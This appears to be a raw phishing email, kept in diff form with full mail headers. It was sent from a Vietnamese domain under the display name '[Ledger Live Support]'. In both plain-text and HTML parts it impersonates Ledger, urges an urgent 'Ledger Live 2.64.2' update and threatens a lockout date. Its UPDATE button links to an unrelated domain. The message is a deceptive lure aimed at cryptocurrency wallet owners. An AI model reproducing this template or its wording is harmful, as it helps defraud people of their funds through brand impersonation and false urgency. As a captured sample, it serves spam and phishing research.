@@ -1,0 +1,340 @@
+Return-Path: <no-reply@amela.vn>
+Delivered-To: untroubl8492-bruce@untroubled.org
+Received: (qmail 2006888 invoked from network); 17 Aug 2023 09:26:20 -0000
+Received: from APC01-TYZ-obe.outbound.protection.outlook.com (mail-tyzapc01on2109.outbound.protection.outlook.com [40.107.117.109])
+  by vx0.untroubled.org ([45.63.65.23])
+  with ESMTP via TCP; 17 Aug 2023 09:26:19 -0000
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=Uwi1gssBbEwGTUAj8wfSwR9vYniVi9bqj4ac58TEXWs/eABE6llcBGkJZx0E3aOtPCVrse7hHw+Gdi/zOya7KJXaPbJMy7wv0Jwxwg9yyBMO8Pq/+jQHUzVccEECYTQRf98gEVUKdRd1cfMbd1CnVT8OVf+og5BtnDYJwxVcJdepN+LRfun1DhG2SIpKQDRKhFqhThCdtU4NZyfRgF9TuX+l8AHd3gH7rkCgkEJVhVpYjf7WRN4yYCaPRs8YpjAf5W8RKq2o8E9//lKWwu7rC7PtYJj+NHcS7TiSQ0vcjyUIOVS92DlRajmAG3bC5yc84NAK/DR6hpFO7FDg4luHNg==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=LPV6ASl3He/Qic4BPa7rKo11u0nvtbsWhHrIBtMnuHk=;
+ b=QxQyosfHDC+GjA41EGV/tHjoyFBsfm/3xFcxyfijYBIdw3qISpQpLYhDcW+vz+qf7jU1k99R1y/h/ITMR8ZnLBSqM/28/2Lb9+18yII2IilNPE1iCr+WQoN1/ClucbusJWwuEHzjwd9HA8X6F7JuIsMMHomL+juP76pKF7jO/EwIafRc9eOtawMtZNTZ29H7QA+QMZTT20MxhZ/7UYY5RQi5xBpB95Q4n0ri4yT0PQDnKfhW+C1fqLYLqR64O2ldocSEC/hpOsq6DXtZpCQeq4gc0jVxhmKEEY9dLO1NquLfX0w6GIuS66EUHpfYNfGNV2+jtKjdh6bE9LKxcZvFWg==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=amela.vn; dmarc=pass action=none header.from=amela.vn;
+ dkim=pass header.d=amela.vn; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=amela.vn; s=selector1;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=LPV6ASl3He/Qic4BPa7rKo11u0nvtbsWhHrIBtMnuHk=;
+ b=uCOFTu5URjQthtXTisYTvLNNWvthrqDY5UpW14AqxhcA8kh1Z7YMYaB8qckLEBlwqixTayVNXLj0VeO84UKvHlBRNqOUfo2yiCLWt/qlRfQFa+XCaNpCQFa77+0jzD9/sp1lhlqv+asBtyQiWagte/JQ9gmBbaj4ZMKkXREYksGS4euka3MywdWcK6XfnnwQO7izC3z9WmbIRnHSjKXMLLUOq0ldTPOZ4LlUM/7qsiET3ZY+EbMoAIDVNXBo64C1SiBrQ9CkqX2IpHb3+8WC3TsE0tkqkvPRjdqTQn//KjUgRTdC9QME7jlYqnoBxOM/217F0IbWHkFXRa9tEY6rFg==
+Authentication-Results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=amela.vn;
+Received: from TY0PR02MB5327.apcprd02.prod.outlook.com (2603:1096:400:143::8)
+ by KL1PR02MB5201.apcprd02.prod.outlook.com (2603:1096:820:6d::6) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6678.29; Thu, 17 Aug
+ 2023 09:26:14 +0000
+Received: from TY0PR02MB5327.apcprd02.prod.outlook.com
+ ([fe80::1b2e:41e9:1b03:e1c4]) by TY0PR02MB5327.apcprd02.prod.outlook.com
+ ([fe80::1b2e:41e9:1b03:e1c4%5]) with mapi id 15.20.6678.025; Thu, 17 Aug 2023
+ 09:26:14 +0000
+From: "[Ledger Live Support]" <no-reply@amela.vn>
+Date: Thu, 17 Aug 2023 11:26:13 +0200
+Subject: important message
+Message-Id: <HCF4CCRWQKU4.OQP73L3UMZU82@smtp.office365.com>
+To: bruce@untroubled.org
+Content-Type: multipart/alternative; boundary="=-IIm5vbqwYzcdRfxf1J5I8A=="
+X-ClientProxiedBy: AM9P193CA0013.EURP193.PROD.OUTLOOK.COM
+ (2603:10a6:20b:21e::18) To TY0PR02MB5327.apcprd02.prod.outlook.com
+ (2603:1096:400:143::8)
+Return-Path: no-reply@amela.vn
+MIME-Version: 1.0
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: TY0PR02MB5327:EE_|KL1PR02MB5201:EE_
+X-MS-Office365-Filtering-Correlation-Id: 2bc13b30-bf1a-4cf6-faf2-08db9f0400ab
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam: BCL:0;
+X-Microsoft-Antispam-Message-Info:
+	13gak/VuBp8cjT/KhjUD5SK8cg0ekwNpW1kdygcfBNvYzD/CSUsfVUv5S27KGZbVva1eUhdamVZjlABahOSUCiH04dQ74QPI2Z8+VBXH3syI2MmdysUV7ebN1t27csO7lTv5z2yXUJuloBbe1bHjwEiUIAd1cfStrk78tizdHWQgX5c5rnz4HB1JAjV2193imRy2sWoyElr5GOyCThmBJY2yBhxDgWXDDwzOsJv5QL4Maom/s15SDtIywl3WEMoEGymZDRd4LT+0cr0likKEt54LVFx4+Nys0ieyIA1uccIrOykCR5iv8R5wk5mR/DlS+GEFN68aMaE9djfpLvnNATHHDK1XGM3k4OlcrVjudIcKOupwQHi5NHmpQaIlCRN8Faq+e4krNozxEdjVfr7pXnUf3HzLks4Voz5tpTV6Qvs3HCZdyoL4Pr6TOBoBx4iZ001z5csjxxDtSx1UjnndrYJA3K1ryhpJ0VMi8noFyNxyIvOuBuK9clL2KINeaXNbZC9WINj+8xajgCgU2aX65c+RUdY7xBlkWCEJNgGjHP07FSPwebxkCXAw/739e6jTJYWAdo9IdFEaFh6BBUMxR6CBhpygpWV9XiCbZ4VfBG1t6KMz3N/0W72J8ld+x0JT
+X-Forefront-Antispam-Report:
+	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:TY0PR02MB5327.apcprd02.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230031)(396003)(366004)(136003)(346002)(376002)(39850400004)(1800799009)(451199024)(186009)(15650500001)(2906002)(83380400001)(26005)(86362001)(478600001)(6506007)(33964004)(6486002)(33656002)(6512007)(9686003)(52116002)(3480700007)(7116003)(5660300002)(166002)(41300700001)(316002)(66476007)(66946007)(66556008)(6916009)(19627405001)(8676002)(8936002)(66574015)(38100700002)(38350700002)(19625905003);DIR:OUT;SFP:1102;
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0:
+	=?utf-8?B?RFI5amJtSythOHNOWk5SVWVxRXpCRS9LWHlsWS9JZmtvdFBPWjl0YmVxKzN2?=
+ =?utf-8?B?NUFtVXF1M0dhRU1GM3dTcndERitkRzZuYTdwNkxjdmRXbkQyOHl6WVRhK25H?=
+ =?utf-8?B?dTFrQXhCU1JkYzJ3K1pXNS80SXRqL085dnBTQ0JlLzRTblV2dHJHa2pPbzNo?=
+ =?utf-8?B?RUpoV2YzbVVuRU1Qc2srSkEraWVuMEtqTXh6WlFoVTZoTHhOVTdyek5jNGlP?=
+ =?utf-8?B?SGhmYzNKZW56RTFNUXp2Y0RQT1hkWEpYWDlLYkxpTk5TTWh0ajV5cXBTYkpZ?=
+ =?utf-8?B?dkpvSjhmUGxXTlZlVWRIcFg0ODFCVVBkc1dja1NndHBoOGMrZ3A3Q2FQNlVE?=
+ =?utf-8?B?TllxRHJFYzI1NWJhMTAvYzBUcEJCZHJGc21LS2h3dU9JKzY4S0xiSi9tSEFz?=
+ =?utf-8?B?NC9iTXRlL284UUVvSnJ1bUNIYmRMdzcwaUtBYjdaRzdaRldGempQTUtuSjl3?=
+ =?utf-8?B?OG1YL2thb3E2Q3pxdHc0djhqQkZDdmlyRXBpSUcxNVBrM1N3ZFZSTlovZWdM?=
+ =?utf-8?B?bjVDRHRSZktGVUpyRUhQVGkxYkxBQmtqcEQ2NHQ3WkljbnF4bzJsUGFibm9W?=
+ =?utf-8?B?R00zcld5WTg5QWFwdzVJdGxocjVHQTJwL00xTENpWXZITFF5NFJPL2lnY3Zx?=
+ =?utf-8?B?Zm15TDVuT0gwNFhQbERhZGYrVGFxRWRzSU84MXBqYVJpQTBkNVdSQS8rZGNR?=
+ =?utf-8?B?d25ZbU55UWgzVWpSSmpaMHJyclBiVG5mbnp2bDB6enhod094VzN5Rk5KNzJS?=
+ =?utf-8?B?cCt4alBzQWF6STJUclZwK1lES0ZDZHhxV2NVdUN2clhQaWdpSktjM1FYUVRR?=
+ =?utf-8?B?R3N0M2NUZlVQQk9YWHUzay84MjRWYUJRMUkxcEV5K0x4b0VLYU9hdS9aRERJ?=
+ =?utf-8?B?ZXVudEROVGhQYWtrSEltV0R5cDBZQjg3OUhRakpLTytjVmNmblh4UHNwQ1p0?=
+ =?utf-8?B?YzU5UXF6Wll2ckFXV1Axb2dyRHJ2eVcvY1hyOTBBcHZrWmZvRGtmMnZockZo?=
+ =?utf-8?B?WEQvYlAzS3JMRTd6SUcwZDBDQzFSYkdpckltWkhwaXoweVVsY3ZUalNGb29z?=
+ =?utf-8?B?UWp5N3hubzZad09WNlk2eWltVUdQTTJPS3daVGliZWNsWGNlUmV1c0VyanNx?=
+ =?utf-8?B?OTc3UFlBSkF3U0l3YnNXeGMvK1JEYmNIWXJDck9hTFY1dEN0Sm8vVXFEYXIy?=
+ =?utf-8?B?OFJidlQ1Vm1FSkpRakIzRXFkUGRnbU93Y2gxWVpONE5UY3MyNk84MTBmeGNI?=
+ =?utf-8?B?dmRDV1BxNlIyQWR6NzUxMmRSK1ZWNm52Um9ZUXliOXFhN1pRbnFKc0NMRkJ6?=
+ =?utf-8?B?THArWHdQMU9FRk9iemhuZ2NjbnZDYVVkVmFpeXBmMXUzNlY1TCs5UnY5L0V3?=
+ =?utf-8?B?VTQyYzI5WmJ0Y0lCTHpRem9DcEtQM1A4UXJmdkNuSXVVbWVpelYrRjN6VlJv?=
+ =?utf-8?B?ZU9GRDhEN1RJYkkwU294bkhIUkIvTmc2ZmZyNC9mT1V4djBmMG5ybnZONUkw?=
+ =?utf-8?B?NjdNSm1IbkRzbFVsT05sV3FUUFZkYjE4SENUOUxoWk1TT0lmc3pQbGZ0M1pu?=
+ =?utf-8?B?RGJGUU56T0kzcUNISWNtNytwcWZ0alIrU2IyVDZWQXFLQzBHV05ScEtZT0tP?=
+ =?utf-8?B?T01sWFMyWU55UUc3bkxjeDNzbnRwTEY4ZUVrYTViS2wzMWx5OTNOMDJPd09s?=
+ =?utf-8?B?TGMxL2VRRy96TlZTYTUyb0srQ09lUE5yckk5M0NCTHZNZnJRNXF0dTZGQnNO?=
+ =?utf-8?B?UDU1VVB2L1BCbCtpSzVJNmZ0eVlPVnFEc05UZld3SEQxcElSY3d0d09ucHh2?=
+ =?utf-8?B?L1A4Sk1ySDZNU29WSXd0a0RhcDNhakFMTzhaLytJcUsrek93WmJzaGtybUZK?=
+ =?utf-8?B?Qkhad3ZuSUdUV3YvRTJDUTdTVURJencrc3VwKzlKcWpDdjBEZkJJcnJ3dmxO?=
+ =?utf-8?B?OFowcm54U1RCU09SWUNCWmY5YzkraExVNThhQkFvYTQ1V1orWkxnTUh0eDlV?=
+ =?utf-8?B?UVc5MlJNOU1SYXFuY3gvd0RoSWVkdHJLSWxsSUwyTENtaGozU01mbFlIMnN4?=
+ =?utf-8?B?bDlPbVZqMDdVSmJDNmVRV1RZMU9BTTJEU0phUmlRb3FHUktHc2ZrL3B2cGk1?=
+ =?utf-8?Q?NPZRRJnoksL7Lg2hDzaG+hM+F?=
+X-OriginatorOrg: amela.vn
+X-MS-Exchange-CrossTenant-Network-Message-Id: 2bc13b30-bf1a-4cf6-faf2-08db9f0400ab
+X-MS-Exchange-CrossTenant-AuthSource: TY0PR02MB5327.apcprd02.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 17 Aug 2023 09:26:14.4545
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 94675deb-b6ed-4d28-8d46-e477fdb4a97d
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: biR/PEqXreaTCMlNnE7npc5o29CwCZVBp+uXYMMfr84a+sxoCE2l1vl16ZbfzMlnsLy3vzDYJsfUQE2mG3GpsQ==
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: KL1PR02MB5201
+
+--=-IIm5vbqwYzcdRfxf1J5I8A==
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+96
+
+[ L E D G E R - LIVE ]
+
+© Ledger SAS. All rights reserved. Ledger brands are registered trademarks of Ledger SAS.
+
+.
+
+ACTION REQUIRED
+
+The new update of Ledger Live 2.64.2 is available.This update is recommended to maintain the security of this platform. When you use a wallet that exists as an interface on your computer or phone, your private keys are always connected to the internet.
+
+In order to keep this  application up to date and safe, we have to keep updating our platform. The new update of Ledger Live is recommended for all our users. This update can be done easily via our personal link below and following the steps.
+
+Applications that are not up to date will be locked out of use from our platform due to outdated software on:
+
+Monday August 28 2023
+
+UPDATE
+
+We're sorry for any inconvenience we cause with this, please we keep in mind that our intention is to keep our users safe and satisfied.
+--=-IIm5vbqwYzcdRfxf1J5I8A==
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" lang="en"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="x-apple-disable-message-reformatting">
+<meta http-equiv="X-UA-Compatible">
+
+<meta name="viewport" content="target-densitydpi=device-dpi">
+<meta content="true" name="HandheldFriendly">
+<meta content="width=device-width" name="viewport">
+<style type="text/css">
+table 
+border-collapse: separate;
+table-layout: fixed;
+mso-table-lspace: 0pt;
+mso-table-rspace: 0pt
+
+table td 
+border-collapse: collapse
+
+.ExternalClass 
+width: 100%
+
+.ExternalClass,
+.ExternalClass p,
+.ExternalClass span,
+.ExternalClass font,
+.ExternalClass td,
+.ExternalClass div 
+line-height: 100%
+
+* 
+line-height: inherit;
+text-size-adjust: 100%;
+-ms-text-size-adjust: 100%;
+-moz-text-size-adjust: 100%;
+-o-text-size-adjust: 100%;
+-webkit-text-size-adjust: 100%;
+-webkit-font-smoothing: antialiased;
+-moz-osx-font-smoothing: grayscale
+
+html 
+-webkit-text-size-adjust: none !important
+
+img+div 
+display: none;
+display: none !important
+
+img 
+Margin: 0;
+padding: 0;
+-ms-interpolation-mode: bicubic
+
+h1, h2, h3, p, a 
+line-height: 1;
+overflow-wrap: normal;
+white-space: normal;
+word-break: break-word
+
+a 
+text-decoration: none
+
+h1, h2, h3, p 
+min-width: 100%!important;
+width: 100%!important;
+max-width: 100%!important;
+display: inline-block!important;
+border: 0;
+padding: 0;
+margin: 0
+
+a[x-apple-data-detectors] 
+color: inherit !important;
+text-decoration: none !important;
+font-size: inherit !important;
+font-family: inherit !important;
+font-weight: inherit !important;
+line-height: inherit !important
+
+a[href^="mailto"],
+a[href^="tel"],
+a[href^="sms"] 
+color: inherit;
+text-decoration: none
+
+@media (min-width: 481px) 
+.hd { display: none!important }
+
+@media (max-width: 480px) 
+.hm { display: none!important }
+
+[style*="Lato"] font-family: 'Lato', BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif !important; [style*="Tahoma"] font-family: 'Tahoma', BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif !important; [style*="Roboto"] font-family: 'Roboto', BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif !important;
+</style>
+<!--[if !mso]><!-->
+<link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&amp;family=Roboto:wght@400&amp;display=swap" rel="stylesheet" type="text/css">
+<!--<![endif]-->
+<!--[if mso]>
+<xml>
+<o:OfficeDocumentSettings>
+<o:AllowPNG/>
+<o:PixelsPerInch>96</o:PixelsPerInch>
+</o:OfficeDocumentSettings>
+</xml>
+<![endif]-->
+</head>
+<body class="t0" style="min-width:100%;Margin:0px;padding:0px;background-color:#FFFFFF;"><div class="t1" style="background-color:#FFFFFF;"><table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" align="center"><tr><td class="t143" style="font-size:0;line-height:0;mso-line-height-rule:exactly;" valign="top" align="center">
+<!--[if mso]>
+<v:background xmlns:v="urn:schemas-microsoft-com:vml" fill="true" stroke="false">
+<v:fill color=#FFFFFF />
+</v:background>
+<![endif]-->
+<table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" align="center"><tr><td>
+<table class="t121" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t122" style="background-color:#000000;overflow:hidden;width:800px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t122 style="background-color:#000000;overflow:hidden;width:800px;"><![endif]-->
+<table role="presentation" width="100%" cellpadding="0" cellspacing="0"><tr><td>
+<table class="t125" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t126" style="width:600px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t126 style="width:600px;"><![endif]-->
+<h1 class="t132" style="margin-bottom:0;Margin-bottom:0;font-family:BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif,'Roboto';line-height:34px;font-weight:400;font-style:normal;font-size:28px;text-decoration:none;text-transform:none;direction:ltr;color:#FFFFFF;text-align:center;mso-line-height-rule:exactly;mso-text-raise:2px;">[ L E D G E R - LIVE ]</h1></td>
+</tr></table>
+</td></tr></table></td>
+</tr></table>
+</td></tr><tr><td>
+<table class="t135" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t136" style="background-color:#000000;width:800px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t136 style="background-color:#000000;width:800px;"><![endif]-->
+<p class="t142" style="margin-bottom:0;Margin-bottom:0;font-family:BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif,'Lato';line-height:22px;font-weight:400;font-style:normal;font-size:10px;text-decoration:none;text-transform:none;direction:ltr;color:#F7F2ED;text-align:center;mso-line-height-rule:exactly;mso-text-raise:4px;">© Ledger SAS. All rights reserved. Ledger brands are registered trademarks of Ledger SAS.</p></td>
+</tr></table>
+</td></tr><tr><td>
+<table class="t106" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t107" style="background-color:#000000;width:800px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t107 style="background-color:#000000;width:800px;"><![endif]-->
+<p class="t113" style="margin-bottom:0;Margin-bottom:0;font-family:BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif,'Lato';line-height:22px;font-weight:400;font-style:normal;font-size:10px;text-decoration:none;text-transform:none;direction:ltr;color:#000000;text-align:center;mso-line-height-rule:exactly;mso-text-raise:4px;">.</p></td>
+</tr></table>
+</td></tr><tr><td>
+<table class="t92" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t93" style="background-color:#080707;overflow:hidden;width:800px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t93 style="background-color:#080707;overflow:hidden;width:800px;"><![endif]-->
+<table role="presentation" width="100%" cellpadding="0" cellspacing="0"><tr><td>
+<table class="t96" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t97" style="width:600px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t97 style="width:600px;"><![endif]-->
+<p class="t103" style="margin-bottom:0;Margin-bottom:0;font-family:BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif,'Lato';line-height:22px;font-weight:400;font-style:normal;font-size:16px;text-decoration:none;text-transform:none;direction:ltr;color:#E05E00;text-align:center;mso-line-height-rule:exactly;mso-text-raise:2px;">ACTION REQUIRED</p></td>
+</tr></table>
+</td></tr></table></td>
+</tr></table>
+</td></tr><tr><td><div class="t65" style="mso-line-height-rule:exactly;mso-line-height-alt:22px;line-height:22px;font-size:1px;display:block;">&nbsp;</div></td></tr><tr><td>
+<table class="t67" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t68" style="width:600px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t68 style="width:600px;"><![endif]-->
+<p class="t74" style="margin-bottom:0;Margin-bottom:0;font-family:BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif,'Lato';line-height:22px;font-weight:400;font-style:normal;font-size:12px;text-decoration:none;text-transform:none;direction:ltr;color:#000000;text-align:center;mso-line-height-rule:exactly;mso-text-raise:3px;">The new update of Ledger Live 2.64.2 is available.This update is recommended to maintain the security of this platform. When you use a wallet that exists as an interface on your computer or phone, your private keys are always connected to the internet.</p></td>
+</tr></table>
+</td></tr><tr><td><div class="t66" style="mso-line-height-rule:exactly;mso-line-height-alt:15px;line-height:15px;font-size:1px;display:block;">&nbsp;</div></td></tr><tr><td>
+<table class="t25" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t26" style="width:600px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t26 style="width:600px;"><![endif]-->
+<p class="t32" style="margin-bottom:0;Margin-bottom:0;font-family:BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif,'Lato';line-height:22px;font-weight:400;font-style:normal;font-size:12px;text-decoration:none;text-transform:none;direction:ltr;color:#000000;text-align:center;mso-line-height-rule:exactly;mso-text-raise:3px;"> In order to keep this  application up to date and safe, we have to keep updating our platform. The new update of Ledger Live is recommended for all our users. This update can be done easily via our personal link below and following the steps.</p></td>
+</tr></table>
+</td></tr><tr><td><div class="t24" style="mso-line-height-rule:exactly;mso-line-height-alt:15px;line-height:15px;font-size:1px;display:block;">&nbsp;</div></td></tr><tr><td>
+<table class="t5" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t6" style="width:600px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t6 style="width:600px;"><![endif]-->
+<p class="t12" style="margin-bottom:0;Margin-bottom:0;font-family:BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif,'Lato';line-height:22px;font-weight:400;font-style:normal;font-size:12px;text-decoration:none;text-transform:none;direction:ltr;color:#000000;text-align:center;mso-line-height-rule:exactly;mso-text-raise:3px;"></p></td>
+</tr></table>
+</td></tr><tr><td><div class="t4" style="mso-line-height-rule:exactly;mso-line-height-alt:15px;line-height:15px;font-size:1px;display:block;">&nbsp;</div></td></tr><tr><td>
+<table class="t77" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t78" style="width:600px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t78 style="width:600px;"><![endif]-->
+<p class="t84" style="margin-bottom:0;Margin-bottom:0;font-family:BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif,'Lato';line-height:22px;font-weight:400;font-style:normal;font-size:16px;text-decoration:none;text-transform:none;direction:ltr;color:#333333;text-align:left;mso-line-height-rule:exactly;mso-text-raise:2px;">Applications that are not up to date will be locked out of use from our platform due to outdated software on:</p></td>
+</tr></table>
+</td></tr><tr><td><div class="t13" style="mso-line-height-rule:exactly;mso-line-height-alt:15px;line-height:15px;font-size:1px;display:block;">&nbsp;</div></td></tr><tr><td>
+<table class="t15" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t16" style="width:600px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t16 style="width:600px;"><![endif]-->
+<h1 class="t22" style="margin-bottom:0;Margin-bottom:0;font-family:Tahoma,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif;line-height:34px;font-weight:400;font-style:normal;font-size:22px;text-decoration:none;text-transform:none;direction:ltr;color:#333333;text-align:center;mso-line-height-rule:exactly;mso-text-raise:4px;">Monday August 28 2023</h1></td>
+</tr></table>
+</td></tr><tr><td><div class="t43" style="mso-line-height-rule:exactly;mso-line-height-alt:35px;line-height:35px;font-size:1px;display:block;">&nbsp;</div></td></tr><tr><td>
+<table class="t45" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t46" style="background-color:#D45100;background-image:url(https://uploads.tabular.email/e/5ac5d223-b324-4278-a4d6-2931b5d96098/18e6a990-df51-42bf-be87-191dff02f34d.png);background-repeat:no-repeat;background-size:contain;background-position:left center;overflow:hidden;width:230px;text-align:center;line-height:24px;mso-line-height-rule:exactly;mso-text-raise:2px;padding:10px 10px 10px 10px;border-radius:25px 25px 25px 25px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t46 style="background-color:#D45100;background-image:url(https://uploads.tabular.email/e/5ac5d223-b324-4278-a4d6-2931b5d96098/18e6a990-df51-42bf-be87-191dff02f34d.png);background-repeat:no-repeat;background-size:contain;background-position:left center;overflow:hidden;width:250px;text-align:center;line-height:24px;mso-line-height-rule:exactly;mso-text-raise:2px;padding:10px 10px 10px 10px;border-radius:25px 25px 25px 25px;"><![endif]-->
+<a class="t52" href="https://economistegy.com" style="display:block;margin-bottom:0;Margin-bottom:0;font-family:BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif,'Lato';line-height:24px;font-weight:700;font-style:normal;font-size:16px;text-decoration:none;direction:ltr;color:#F2F0F0;text-align:center;mso-line-height-rule:exactly;mso-text-raise:2px;" target="_blank">UPDATE </a></td>
+</tr></table>
+</td></tr><tr><td><div class="t44" style="mso-line-height-rule:exactly;mso-line-height-alt:50px;line-height:50px;font-size:1px;display:block;">&nbsp;</div></td></tr><tr><td>
+<table class="t57" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t58" style="width:600px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t58 style="width:600px;"><![endif]-->
+<p class="t64" style="margin-bottom:0;Margin-bottom:0;font-family:BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif,'Lato';line-height:22px;font-weight:400;font-style:normal;font-size:10px;text-decoration:none;text-transform:none;direction:ltr;color:#000000;text-align:center;mso-line-height-rule:exactly;mso-text-raise:4px;">We're sorry for any inconvenience we cause with this, please we keep in mind that our intention is to keep our users safe and satisfied.</p></td>
+</tr></table>
+</td></tr><tr><td><div class="t56" style="mso-line-height-rule:exactly;mso-line-height-alt:200px;line-height:200px;font-size:1px;display:block;">&nbsp;</div></td></tr><tr><td>
+<table class="t35" role="presentation" cellpadding="0" cellspacing="0" align="center"><tr>
+<!--[if !mso]><!--><td class="t36" style="width:600px;">
+<!--<![endif]-->
+<!--[if mso]><td class=t36 style="width:600px;"><![endif]-->
+<p class="t42" style="margin-bottom:0;Margin-bottom:0;font-family:BlinkMacSystemFont,Segoe UI,Helvetica Neue,Arial,sans-serif,'Lato';line-height:22px;font-weight:400;font-style:normal;font-size:8px;text-decoration:none;text-transform:none;direction:ltr;color:#000000;text-align:center;mso-line-height-rule:exactly;mso-text-raise:4px;"></p></td>
+</tr></table>
+</td></tr></table></td></tr></table></div></body>
+</html>
+--=-IIm5vbqwYzcdRfxf1J5I8A==--
